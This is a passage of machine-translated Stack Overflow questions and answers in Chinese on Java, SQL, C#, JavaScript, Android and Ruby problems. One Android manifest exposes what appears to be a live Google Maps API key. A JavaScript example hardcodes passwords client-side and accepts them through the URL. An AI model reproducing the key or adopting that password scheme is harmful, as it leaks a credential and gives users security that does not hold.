request.addBodyPart(new MimeBodyPart(new FileInputStream(new File(
        fileName))));

final String response = resource
    .entity(request, "multipart/form-data")
    .accept("text/plain")
    .post(String.class); 
```

上面的代码只是将一个文件附加到一个多部分请求，并将请求发送到服务器。对于客户端和服务器端代码，都依赖于 Jersey 和 JavaMail 库。如果您使用的是 Maven，则可以通过以下依赖项轻松下拉这些内容：

```
<dependency>
    <groupId>com.sun.jersey</groupId>
    <artifactId>jersey-core</artifactId>
    <version>1.17</version>
</dependency>

<dependency> <!-- only on server side -->
    <groupId>com.sun.jersey</groupId>
    <artifactId>jersey-server</artifactId>
    <version>1.14</version>
</dependency>

<dependency> <!-- only on client side -->
    <groupId>com.sun.jersey</groupId>
    <artifactId>jersey-client</artifactId>
    <version>1.17</version>
</dependency>

<dependency>
    <groupId>com.sun.jersey</groupId>
    <artifactId>jersey-json</artifactId>
    <version>1.17</version>
</dependency>

<dependency>
    <groupId>javax.mail</groupId>
    <artifactId>mail</artifactId>
    <version>1.4.6</version>
</dependency> 
```

*根据需要调整依赖版本*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2017-06-04T14:38:41.473

我是否正确假设，因为它是 MimeMultipart 类型，我不能只发送一个，而是多个文件或附加信息可能是字符串或其他，只做一个简单的帖子，只需添加多个包含不同文件的 MimeBodyPart 或其他? 例如像：

```
final MimeMultipart request = new MimeMultipart();
request.addBodyPart(new MimeBodyPart(new FileInputStream(new File(
    fileOne))), 0);
request.addBodyPart(new MimeBodyPart(new FileInputStream(new File(
    fileTwo))), 1); 
```

等等

# mysql - 创建表返回错误 1064 语法错误

> ID：15262969
> 
> 赞同：0
> 
> 时间：2013-03-07T04:15:58.310
> 
> 标签：mysql, sql

我正在使用此代码在数据库中创建一个表。似乎正确，但我收到语法错误。我直接使用来自[http://dev.mysql.com/doc/refman/5.6/en/create-table.html](http://dev.mysql.com/doc/refman/5.6/en/create-table.html)的语法，但没有雪茄。想法？

```
create table car (
VIN integer primary key autoincrement, 
make text not null, 
model text not null, 
year text not null); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:19:06.857

错字：`auto_increment`不是`autoincrement`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:19:35.720

您在自动增量语法中是错误的。

用这个：

```
create table car (
VIN integer  primary key auto_increment, 
make text not null, 
model text not null, 
year text not null); 
```

更多：[AUTO_INCREMENT](http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:20:47.537

```
create table car (
   VIN integer AUTO_INCREMENT PRIMARY KEY, 
   make text not null, 
   model text not null, 
   year text not null
); 
```

应该管用

# teamcity-7.0 - 在 TeamCity Professional 7.1.4（内部版本 24331）中，如何指定构建代理的结帐目录？

> ID：15262970
> 
> 赞同：0
> 
> 时间：2013-03-07T04:16:02.440
> 
> 标签：teamcity-7.0

最近我们发生了服务器崩溃，我们不得不重新安装 teamcity。不幸的是，备份没有正确完成，我们必须重新配置它。我们正在使用新版本 7.1.4。

在 6.5 中，我记得能够指定构建代理的检出目录。我很难在 7.1.4 中找到可以做到这一点的地方。但似乎默认情况下它是：

```
C:\TeamCity\buildAgent\work\7af1ebc62605b268 
```

我假设字母数字目录可能会发生变化。

也许那个特性，即指定 svn checkout 目录的选项，被取消了。在任何情况下，我都想指定 checkout 目录，因为我们的一些测试已经硬编码了该参数，它可以省去我在代码中确定运行时 checkout 目录的麻烦。

问题是当我使用 MSBUILD 选项时，当前目录实际上是

```
C:\TeamCity\buildAgent\temp\buildTmp\SYSTEM_DEVSERVER 2013-03-06 22_22_14\Out 
```

并且需要知道 teamcity 结帐才能加载测试输入文件。

有谁知道现在是否确实可以在 7.1.4 中指定构建代理 svn checkout 目录？如果没有，我最好找到解决方法。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:50:44.257

我瞎了。

Checkout 目录位于构建配置的“版本控制设置”配置步骤中。

默认情况下，它设置为“自动”。在您在上面的组合框中选择自定义路径之前，不会出现要编辑它的文本框。我一定是扫描了文本框而忽略了阅读组合框标题。

哎呀。

# c# - 实体框架将记录添加到多对多映射表中

> ID：15262974
> 
> 赞同：10
> 
> 时间：2013-03-07T04:16:25.547
> 
> 标签：c#, .net, entity-framework, many-to-many

我有3张桌子，

1) 客户 (Id, Name, bla bla)

2) CustomerGroups (GroupId, GroupName)

3) CustomerInGroups (CustomerId, GroupId)

```
using (var context = DataObjectFactory.CreateContext())
{                
    context.Customers.Add(entity);
    context.SaveChanges();
    return entity.Id;
} 
```

如何将记录添加到 CustomerInGroups？EntityFramework 不会为这种多对多映射表生成实体

编辑：

Customer 和 CustomerGroups 中的 Id 列都设置为自动递增。

所以在我的 CustomersGroup 表中，我有

```
Id          Name
----------------------------
1           Normal
2           VIP 
```

我尝试按照其中一位海报的建议这样做：

```
entity.CustomerGroups = new List<CustomerGroup>
{
    new CustomerGroup {Id = 2 }
};
context.Customers.Add(entity);
context.SaveChanges();
return entity.Id; 
```

但是，当我这样做时，而不是像这样在映射表中创建记录：

```
CustomerId          GroupId
----------------------------
1                   2 
```

我得到的是

```
CustomerInGroups
    CustomerId          GroupId
    ----------------------------
    1                   3

CustomerGroups
    Id          Name
    ----------------------------
    1           Normal
    2           VIP
    3           NULL 
```

它实际上在我的 CustomerGroups 表中创建了另一个条目，这不是我想要的

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-07T04:22:36.713

飞行有点盲目，因为你没有包括什么属性`entity`。但是您应该拥有与 的关系的属性`CustomerGroups`。只需将该属性设置为您要关联的组即可。例如，这将创建一个新的组名称“foo bar”并将实体与该组相关联。

```
using (var context = DataObjectFactory.CreateContext())
{
    entity.CustomerGroups = new List<CustomerGroup> { GroupName = "Foo bar" };
    context.Customers.Add(entity);
    context.SaveChanges();
    return entity.Id;
} 
```

如果关系设置正确，EF 会自动在表中插入一条记录`CustomerGroups`并将关系插入到`CustomerInGroups`表中。

编辑：

如果您尝试将现有客户添加`CustomerGroup`到新客户。您需要`CustomerGroup`先从数据库中获取，然后将其添加到您要插入的客户实体中。

```
using (var context = DataObjectFactory.CreateContext())
{
    var customerGroups = context.CustomerGroups.Where(...).ToList(); // get your CustomerGroup object(s) here, and ensure it's enumerated with ToList()
    entity.CustomerGroups = customerGroups;
    context.Customers.Add(entity);
    context.SaveChanges();
    return entity.Id;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-07T10:16:28.263

如果您尝试将*现有*客户分配给 _existing 组并假设 CustomerGroup 对象公开 ICollection，请执行以下操作：

```
(var context = DataObjectFactory.CreateContext())
{
    context.Customers.Add(entity);
    var group = context.CustomerGroups.Find(2); // or however you retrieve the existing group
    group.Customers.Add(entity);
    context.SaveChanges();
    return entity.Id
} 
```

Find() 方法是通过 Id 查找的实体框架代码优先 (DbContext) 方法。我不记得“正确的” ObjectContext 的做法，但是 .Single(g => g.Id == 2) 也可以。

理想情况下，您应该让我们更好地了解您的实体是如何映射的，以便我们知道您如何关联您的实体。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-06-10T15:45:50.583

除了@Steven-v 的回答，如果您之前获取了客户组并且不想再次从数据库中获取它们，您也可以将它们附加到上下文中。

```
foreach (var c in customer.CustomerGroups)
{
     _db.CustomerGroups.Attach(c);
}        
_db.Customer.Add(customer);
_db.SaveChanges(); 
```

# javascript - 如何在 url 中放置一个 javascript 变量？

> ID：15262976
> 
> 赞同：0
> 
> 时间：2013-03-07T04:16:31.173
> 
> 标签：javascript

所以你知道有时网站的名字后面会有一个小“？variable=value”的东西吗？我该如何使用它？我很确定A）变量没有像它应该的那样定义或B）这部分代码存在问题：

```
if (! variable) {
  var variable;
} 
```

那么我该怎么做呢？

编辑：这是我试图运行的完整脚本，它的目的是为了一个简单的密码保护页面，但我想允许密码在 url 中传递，所以在切换页面时你不必重新输入密码不断。

```
 <script>
      var m = location.href.match(/[?&]variable=([^&]*)/),
      password;
      if (m) {
        password = m[1];
      }
      var pass1="password";
      var pass2="abcd";
      if (password!==pass1 || password!==pass2) {
        password=prompt('Please enter your password to view this page!',' ');
        if (password==pass1 || password==pass2) {
          alert('Password Correct!');
        } else {
          history.go(-1);
        }
      }
  </script> 
```

无论 url 中有什么，这段代码都会提示我。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-03-07T04:19:42.410

查询字符串中的参数不会自动传递给 Javascript；它们通常用于服务器端脚本。要获得一个变量，您可以这样做：

```
var m = location.href.match(/[?&]variable=([^&]*)/),
password;

if (m) {
    password = m[1];
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:19:12.613

你可以像这样传递变量：

```
<script language="javascript" type="text/javascript">
var scrt_var = 10; 
</script>
<a href="2.html" onclick="location.href=this.href+'?key='+scrt_var;return false;">Link</a> 
```

或像这样：

将 id 属性放在锚元素上

```
 <a id="link2"> 
```

在页面加载事件上设置 href 属性：

```
var scrt_var = 10;
var strLink = "2.html&Key=" + scrt_var;
document.getElementById("link2").setAttribute("href",strLink); 
```

# android - GoogleMap v2 未出现在设备上

> ID：15262978
> 
> 赞同：0
> 
> 时间：2013-03-07T04:16:41.753
> 
> 标签：android, maps

我做了这个例子[http://mobisys.in/blog/2012/12/google-rolls-out-android-maps-api-v2/](http://mobisys.in/blog/2012/12/google-rolls-out-android-maps-api-v2/)，但没有出现在我的设备中的地图

这是我的 AndroidManifest.xml

```
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.control_guard"
android:versionCode="1"
android:versionName="1.0" >

<uses-sdk
    android:minSdkVersion="15"
    android:targetSdkVersion="15"/>
<permission
    android:name="com.control_guard.permission.MAPS_RECEIVE"
    android:protectionLevel="signature" />
<uses-feature
    android:glEsVersion="0x00020000"
    android:required="true" />
<uses-permission android:name="com.control_guard.permission.MAPS_RECEIVE" />
<uses-permission android:name="android.permission.INTERNET" >
</uses-permission>
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

<application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name"
    android:theme="@style/AppTheme" >
    <activity
        android:name=".Inicio"
        android:label="@string/title_activity_inicio"
        android:theme="@android:style/Theme.Holo.NoActionBar" 
        android:uiOptions="splitActionBarWhenNarrow">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />

            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>
    <activity
        android:name="Login"
        android:theme="@android:style/Theme.Holo.NoActionBar" >
    </activity>
    <activity android:name="MenuControlGuard" >
    </activity>
    <activity android:name="MenuPrincipal" >
    </activity>
    <activity android:name="Asistencia" 
        android:theme="@android:color/holo_blue_dark">
    </activity>
    <activity android:name="ListaPersonal"
        android:theme="@android:color/holo_blue_dark" >
    </activity>
    <activity
        android:name=".DatosPersonal"
        android:label="@string/title_activity_datos_personal" >
    </activity>
    <activity
        android:name=".ListaClientes"
        android:label="@string/title_activity_lista__clientes" 
        android:theme="@android:color/holo_blue_dark">
    </activity>
    <activity
        android:name=".DatosCliente"
        android:label="@string/title_activity_datos_cliente" >
    </activity>
    <activity
        android:name=".MenuReportes"
        android:label="@string/title_activity_menu_reportes" >
    </activity>
    <activity
        android:name=".NuevoReporte"
        android:label="@string/title_activity_nuevo_reporte" >
    </activity>
    <activity
        android:name=".Lista_Reportes"
        android:label="@string/title_activity_lista__reportes"
        android:theme="@android:color/holo_blue_dark" >
    </activity>
    <activity
        android:name=".EditarReporte"
        android:label="@string/title_activity_editar_reporte" >
    </activity>
    <activity
        android:name=".MenuPrincipalOperaciones"
        android:label="@string/title_activity_menu_principal_operaciones" >
    </activity>
    <activity
        android:name=".VerReportes"
        android:label="@string/title_activity_ver_reportes" >
    </activity>
    <activity
        android:name=".ListaSupervisor"
        android:label="@string/title_activity_lista_supervisor"
        android:theme="@android:color/holo_blue_dark" >
    </activity>
    <activity
        android:name=".Mapa"
        android:label="@string/title_activity_mapa" >
    </activity>
    <meta-data
        android:name="com.google.android.maps.v2.API_KEY"
        android:value="AIzaSyAUvGf-KcrLy4ptevrE5LRK9XCVuYf7vOE" />
</application> 
```

`

我的 .xml 是

```
 <fragment
    android:id="@+id/map"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    class="com.google.android.gms.maps.MapFragment" />` 
```

这是我的 .java

```
package com.control_guard;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.support.v4.app.FragmentActivity;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.google.android.gms.maps.CameraUpdateFactory;
import com.google.android.gms.maps.GoogleMap;
import com.google.android.gms.maps.MapFragment;
import com.google.android.gms.maps.model.BitmapDescriptorFactory;
import com.google.android.gms.maps.model.LatLng;
import com.google.android.gms.maps.model.Marker;
import com.google.android.gms.maps.model.MarkerOptions;

public class Mapa extends Activity  {

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.mapa);

    final LatLng HAMBURG = new LatLng(53.558, 9.927);
     final LatLng KIEL = new LatLng(53.551, 9.993);
    final GoogleMap map;

      map = ((MapFragment) getFragmentManager().findFragmentById(R.id.map))
          .getMap();
      Marker hamburg = map.addMarker(new MarkerOptions().position(HAMBURG)
          .title("Hamburg"));
      Marker kiel = map.addMarker(new MarkerOptions()
          .position(KIEL)
          .title("Kiel")
          .snippet("Kiel is cool")
          .icon(BitmapDescriptorFactory
              .fromResource(R.drawable.ic_launcher)));

      // Move the camera instantly to hamburg with a zoom of 15.
      map.moveCamera(CameraUpdateFactory.newLatLngZoom(HAMBURG, 15));

      // Zoom in, animating the camera.
      map.animateCamera(CameraUpdateFactory.zoomTo(10), 2000, null);
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    getMenuInflater().inflate(R.menu.mapa, menu);
    return true;
}` 
```

请我在这个问题上需要帮助，我没有在我的代码中找到错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:55:07.233

您需要一个 api 密钥，清单中的密钥是空的：

```
 <meta-data
    android:name="com.google.android.maps.v2.API_KEY"
    android:value="API-KEY" /> 
```

按照[这个](https://developers.google.com/maps/documentation/android/start#the_google_maps_api_key)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:23:59.120

您是否完成了文档中提到的所有步骤。如果没有，只需完成一次..只需几个简单的步骤..你就可以开始了，他们真的很好

这是链接。

[https://developers.google.com/maps/documentation/android/start](https://developers.google.com/maps/documentation/android/start)

如果问题仍然存在，那么再次提出您的问题..

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T05:17:00.470

您需要一个 API 密钥才能在您的应用程序中显示谷歌地图。请访问此站点并创建 API 密钥并将 API 密钥放入您的 android 清单文件中。 [https://developers.google.com/maps/documentation/android/v1/mapkey](https://developers.google.com/maps/documentation/android/v1/mapkey)

# java - 当使用for循环在jframe上生成图像时，为什么它会停在帧的中间？

> ID：15262979
> 
> 赞同：0
> 
> 时间：2013-03-07T04:16:49.283
> 
> 标签：java, frame, imageicon

所以我试图制作一个简单的 PacMan 克隆，我已经到了添加图像等的阶段。我有两个图像（到目前为止），它们是：
![轨迹球.png](../Images/390a97ac3b3fcca7c4e20f958fa7c23c.png)和![边框.png](../Images/af00448a0043aea6e944ad10404e8524.png)，trackball.png 和border.png。
所以我运行下面的代码`new oicMan();`，这就是我得到
![我得到了什么](../Images/f71f911cb25cab080fd226d8302166e7.png)
的： 控制台输出：

```
.
.
.
Placing image border on coordinate (225,250)
Placing image border on coordinate (225,275)
Placing image border on coordinate (225,300)
Placing image border on coordinate (225,325)
Placing image border on coordinate (225,350)
Placing image border on coordinate (225,375)
Placing image border on coordinate (225,400)
Placing image border on coordinate (225,425)
Placing image border on coordinate (225,450)
Placing image border on coordinate (225,475) 
```

所以它似乎停在 x=225。谁能告诉我为什么？`for`我设置图像的循环有问题吗？谢谢（主要是，请告诉我为什么它没有完全绘画。）

```
import javax.swing.*;
import java.awt.*;

public class oicMan extends JFrame
{
Container container;
/*
####################
# ##               #
# ## ############# #
# ## ############# #
# ## #             #
# ## # ##### ##### #
# ##   ##### ##### #
# ## # ##### ##### #
#    #             #
####################
 */
    String arena[][] =
    {
    {"#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#"},
    {"#"," ","#","#"," "," "," "," "," "," "," "," "," "," "," "," "," "," "," ","#"},
    {"#"," ","#","#"," ","#","#","#","#","#","#","#","#","#","#","#","#","#"," ","#"},
    {"#"," ","#","#"," ","#","#","#","#","#","#","#","#","#","#","#","#","#"," ","#"},
    {"#"," ","#","#"," ","#"," "," "," "," "," "," "," "," "," "," "," "," "," ","#"},
    {"#"," ","#","#"," ","#"," ","#","#","#","#","#"," ","#","#","#","#","#"," ","#"},
    {"#"," ","#","#"," "," "," ","#","#","#","#","#"," ","#","#","#","#","#"," ","#"},
    {"#"," ","#","#"," ","#"," ","#","#","#","#","#"," ","#","#","#","#","#"," ","#"},
    {"#"," "," "," "," ","#"," "," "," "," "," "," "," "," "," "," "," "," "," ","#"},
    {"#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#","#"},
    };

    public oicMan()
    {
        super("oicMan");
        setSize(500, 250);
        setVisible(true);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        container = getContentPane();
        container.setLayout(null);
        container.setBackground(Color.black);

        for(int i = 0; i < arena.length; i++)
        {
            for(int j = 0; j < arena[0].length; j++)
            {
                JLabel label = null;
                if(arena[ i][ j].equals("#"))
                {
                    label = new JLabel(new ImageIcon("border.png"));
                    label.setName("border");
                }
                else
                {
                    label = new JLabel(new ImageIcon("trackball.png"));
                    label.setName("track");
                }

                container.add(label);
                label.setBounds(i*25,j*25,25,25);
                System.out.println("Placing image "+label.getName()+" on coordinate ("+i*25+","+j*25+")");
            }
        }
        repaint();
        container.validate();
        setContentPane(container);
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:13:19.113

当您调用 label.setBounds(i*25,j*25,25,25); 时，似乎您可能已经颠倒了行和列 我认为将那行代码更改为 label.setBounds(j*25,i*25,25,25); 应该解决问题。JLabel setBounds 方法的参数如下： JLabel: setBounds(int x, int y, int width, int height)

正如[这篇 java2s 文章所见](http://www.java2s.com/Code/JavaAPI/javax.swing/JLabelsetBoundsintxintyintwidthintheight.htm)

这意味着当您认为您正在设置 JLabel 的 y 值时，您实际上是在设置 x 值，反之亦然。

一个很好的建议是始终阅读您可能正在使用的任何库的文档。

不过，我总是很乐意提供帮助。

干杯，希望这有助于并解决您的问题！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T05:13:30.330

问题出在你的`arena[][]`. 它具有`10 rows`and `20 columns`，这实际上意味着您的`for`循环将仅针对`200`块运行。

要覆盖整个屏幕，您需要相应地调整您的屏幕`arena[][]`。

**PS：** `(225,475)`是因为`(i*25+","+j*25)`最大`i=9`和`j=19`最大的位置。

# combobox - 组合框不下拉项目列表

> ID：15262980
> 
> 赞同：1
> 
> 时间：2013-03-07T04:16:54.000
> 
> 标签：combobox, telerik, kendo-ui, kendo-combobox

我在我的应用程序中使用了 Kendo ComboBox 并定义了控件的标记，如下所示：

```
@(Html.Kendo().ComboBox().Name("GroupUserName")
    .Placeholder("- Select Group -")
    .Suggest(true)
    .BindTo(
        (Model.Groups ?? new[] { Model.Group })
            .Select(i => new { i.GroupName, i.GroupUserName })
    )
    .DataTextField("GroupName")
    .DataValueField("GroupUserName")) 
```

我知道 BindTo 方法中绑定了 2 条记录，这些记录正在传递给客户端组件。

```
jQuery(
  function(){
    jQuery("#GroupUserName").kendoComboBox({"dataSource":   
       [{"GroupName":"membershipgroup01","GroupUserName":"membershipgroup01"},
       {"GroupName":"publicgroup01","GroupUserName":"publicgroup01"}]
       ,"dataTextField":"GroupName","dataValueField":"GroupUserName",
       "placeholder":"- Select Group -","suggest":true
     });
}); 
```

但是，当我点击下拉菜单时，组合框没有显示任何内容。没有下拉菜单可以让我选择一个值。看这张图片：

![组合框不显示下拉](../Images/6a2928198f713b59866cba077af13958.png)

单击下拉选择器时不会出现下拉菜单。为什么？

我正在使用 JQuery 1.8.2，以及 kendo.all 和 kendo.aspnetmvc 脚本......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:36:17.743

您正在绑定到没有字段名称的匿名类型。Kendo 没有任何东西可以抓取，因为您告诉它绑定的对象没有名为`GroupName`and的字段`GroupUserName`。

从它的外观来看，您根本不需要绑定到匿名类型。所以这：

```
.BindTo(
    (Model.Groups ?? new[] { Model.Group })
            .Select(i => new { i.GroupName, i.GroupUserName })
) 
```

应该：

```
.BindTo(
    (Model.Groups ?? new[] { Model.Group })
) 
```

如果由于某种原因您确实需要绑定到匿名类型，您可以为字段指定适当的名称：

```
.BindTo(
    (Model.Groups ?? new[] { Model.Group })
            .Select(i => new { GroupName = i.GroupName, GroupUserName = i.GroupUserName })
) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-05-12T22:29:55.563

对我来说，这是 JQuery UI 和 Kendo UI 之间的冲突。当我删除对 JQuery UI 的引用时，它起作用了。

# .net - 为什么要列出 实现 IReadOnlyList 在.NET 4.5 中？

> ID：15262981
> 
> 赞同：43
> 
> 时间：2013-03-07T04:17:00.133
> 
> 标签：.net, .net-4.5, base-class-library

为什么在 .NET 4.5中`List<T>`实现？`IReadOnlyList<T>`

`List<T>`不是只读...

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2013-03-07T04:18:10.540

因为`List<T>`实现了所有必要的方法/属性/等。（然后是一些）的`IReadOnlyList<T>`。接口是一个契约，上面写着“我*至少*可以做这些事情”。

> 的文档`IReadOnlyList<T>`说它代表一个只读的元素集合。

这是正确的。该接口中没有 mutator 方法。这就是只读的意思，对吧？`IReadOnlyList<T>`以“典型”（合同）方式使用，而不是作为[标记](http://en.wikipedia.org/wiki/Marker_interface_pattern)。

* * *

## 回答 #2

> 赞同：27
> 
> 时间：2014-09-05T09:35:50.273

接口仅描述将要实现的功能。它没有描述不会实现的功能。因此，IReadOnlyList 是一个不正确的接口名称，因为它不能规定不会写入写入功能。

描述您可以读取列表内容的方法/功能。该接口应该是 IReadableList 而不是 IReadOnlyList。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-08-02T23:30:53.413

实现一个接口与“标记”它不同。`List<T>`也实现`IEnumerable<T>`了，但这并不意味着您仅限于简单地枚举它。

他们为 API 创建添加了只读接口，而不是这样你就可以用接口标记你的只读类型。`IReadOnlyCollection<T>`当我只想知道集合中元素的数量而不枚举它时，或者`IReadOnlyList<T>`当我需要通过索引引用集合中的元素时，它允许我使用参数。这对每个人都有好处——我可以具体说明我的调用者需要什么，同时允许我的调用者使用他想要的任何集合类型，只要它符合我通过参数类型设置的最低标准。

所以我认为更困难的问题是，你为什么*不*`List<T>`实施`IReadOnlyList<T>`？

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2013-03-07T04:21:04.807

它实现接口的事实并不意味着它是只读的。但是因为它实现了接口，您现在可以将它传递给期望`IReadOnlyList<T>`. 所以看待它的方式是，它实现了只读列表接口......以及一些写入方法。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2016-10-16T11:13:07.310

接口`IReadOnlyList`和`IReadOnlyCollection`有点令人困惑，因为它们并不意味着集合是只读的，只是支持只读访问。从[MSDN 文档](https://msdn.microsoft.com/en-us/library/hh192385.aspx#Remarks)（向下滚动到备注）

> 列表元素的内容不保证是只读的。

更好的名称是`IReadable`，请参阅[Why does not generic `ICollection`implement `IReadOnlyCollection`in .NET 4.5?](https://stackoverflow.com/a/12622857/1220972) . 此外，这意味着`IList`应该继承，`IReadOnlyList`尽管它不是由于向后兼容性，请参阅[为什么不`IList<T>`继承自`IReadOnlyList<T>`？](https://stackoverflow.com/q/35938995).

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-03-07T22:35:57.403

IReadOnlyList 是“引用不变性”概念的替代品，该概念在 C++ 中找到，但在 C# 中没有。C++ 等价物是：

无效函数（T const* t）{...}

或完全等效，因为有些人更喜欢：

无效函数（常量 T* t）{...}

它表示函数 func 不会改变其参数 t 引用的对象，称为 t 的“所指对象”。它没有说明任何其他代码是否会改变 t 的所指对象，甚至可以。

因此，C# 接口是编译器构造的替代品。为什么 C# 没有引用不变性的概念是一个历史问题：我认为这是一个错误，但现在修复它为时已晚。我认为提供接口替代品很好。多年来，我一直在使用与 IReadOnlyList<> 完全相同的接口，幸运的是使用了另一个名称 IConstList<>。我可以用 IReadOnlyList<> 代替我对 IConstList<> 的使用。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-06-05T12:24:16.717

运行 IReadOnlyList(Of T) 调用实现该接口的对象的代码通常运行相同的执行线程，这不是真的吗？这可以防止对象自行更改，除非它在不同的执行线程上运行，但对于这种情况，我们有同步调用来解决这个问题。

# c# - 选择数组中的替代值

> ID：15262985
> 
> 赞同：0
> 
> 时间：2013-03-07T04:17:25.273
> 
> 标签：c#

我有一个这样的时间段：

```
TimeSpan Midnight = new TimeSpan(24, 0, 0);
List<DateTime> Timeslot = new List<DateTime>();
Timeslot.Add(BookingStart)
Timeslot.Add(BookingEnd)
Timeslot.Add(breakstart1)
Timeslot.Add(breakEnd1)
Timeslot.Add(breakstart2)
Timeslot.Add(breakEnd2)
Timeslot.Add(breakstart3)
Timeslot.Add(breakEnd3)

for (int i = 1; i <= Timeslot.Count - 1; i++)
{
    if (Timeslot[0] != Timeslot[1])
    {
        if ((Timeslot[i].TimeOfDay < Midnight) &&
            (dutyEnd.TimeOfDay >= Midnight))
        {
            BookedHours = Midnight - Timeslot[i].TimeOfDay;
            // if i value is one then i want get the value like
            // BookedHours = Midnight - Timeslot[i,End].TimeOfDay;
            // BookedHours = Midnight - Timeslot[breakEnd1].TimeOfDay;
        }
    }
} 
```

我在这里尝试做的是，如果我的“i”值为“one”，那么想要获得该`breakEnd1`值。

让我在这里解释清楚

我有一个预订，例如

预订开始于：18.00 和预订结束@（第二天）：7.00

我中间有三个休息时间，这些休息时间如下（breakstart1）开始于：20.00（breakEnd1）结束于：21.00（breakstart2）：24.00（breakEnd2）：01.00（breakstart3）：03.00（breakEnd3）：04.00

现在我想在这里做的是

```
if midnight is not null and timeslot[i,end]<midnight then
am calculating booked hours like = midnight-timeslot[i,end] 
```

现在有意义吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T05:09:49.060

我的解决方案...

```
using System;
using System.Collections.Generic;
using System.Linq;

namespace ConsoleApplication11
{
    class Program
    {
        static void Main(string[] args)
        {

            var bookingStartsAndEnds = new List<DateTime>()
                                           {
                                               DateTime.Parse("1999-02-01 13:50:00"),
                                               DateTime.Parse("1999-02-03 13:50:00"),
                                               DateTime.Parse("1999-02-04 13:05:00"),
                                               DateTime.Parse("1999-02-04 13:15:00"),
                                           };

            var bookedHours = bookingStartsAndEnds
                // order by the date ascending
                .OrderBy(dt => dt)
                // select only the "firsts" of the tuples
                .Where((dt, i) => i%2 == 0)
                // select the first + the next
                .Select((dt, i) => Tuple.Create<DateTime, DateTime?>(dt, bookingStartsAndEnds.ElementAtOrDefault((i*2) + 1)))
                // filter not-matching-end (the list must contain even number of items only!)
                .Where(t => t.Item2 != null)
                // calculate the time-difference between end-date and start-date and get all hours
                .Select(t => (t.Item2.Value - t.Item1).TotalHours)
                // sum them up
                .Sum(); 

            Console.WriteLine("{0:0.00} hours dude! this will be expensive...", bookedHours);
            Console.Read();
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-03-07T04:50:21.383

完全不清楚您要做什么。这没有多大意义：

```
if (Timeslot[0] != Timeslot[1]); 
```

但我怀疑您要做的不是关注列表中的项目本身，而是关注连续的对（Item1 与 Item2、Item2 与 Item3、Item3 与 Item4 等）。

实现此目的的一种方法是将 Timeslot 与其自身的偏移版本合并，如下所示：

```
foreach (var timewindow in Timeslot.Zip(Timeslot.Skip(1),Tuple.Create))
{
     Console.WriteLine(String.Format("handling duration from {0} to {1}",timewindow.Item1,timewindow.Item2));
} 
```

# ruby - 从 HTML 中抓取轨道数据？

> ID：15262997
> 
> 赞同：2
> 
> 时间：2013-03-07T04:18:58.213
> 
> 标签：ruby, xpath, sinatra, web-scraping, nokogiri

我希望能够从 1001tracklists 的曲目列表页面中抓取数据。一个 URL 示例是：

```
http://www.1001tracklists.com/tracklist/25122_lange-intercity-podcast-115-2013-03-06.html 
```

以下是数据如何在页面上显示的示例：

```
Above & Beyond - Black Room Boy (Above & Beyond Club Mix) [ANJUNABEATS] 
```

我想按以下格式从该页面中提取所有歌曲：

```
$byArtist - $name [$publisher] 
```

查看此页面的 HTML 后，我所追求的内容似乎以 HTML5 元微数据格式存储：

```
<td class="" id="tlptr_433662">
<a name="tlp_433662"></a>
<div itemprop="tracks" itemscope itemtype="http://schema.org/MusicRecording" id="tlp5_content">
<meta itemprop="byArtist" content="Above &amp; Beyond">
<meta itemprop="name" content="Black Room Boy (Above &amp; Beyond Club Mix)">
<meta itemprop="publisher" content="ANJUNABEATS">
<meta itemprop="url" content="/track/103905_above-beyond-black-room-boy-above-beyond-club-mix/index.html">
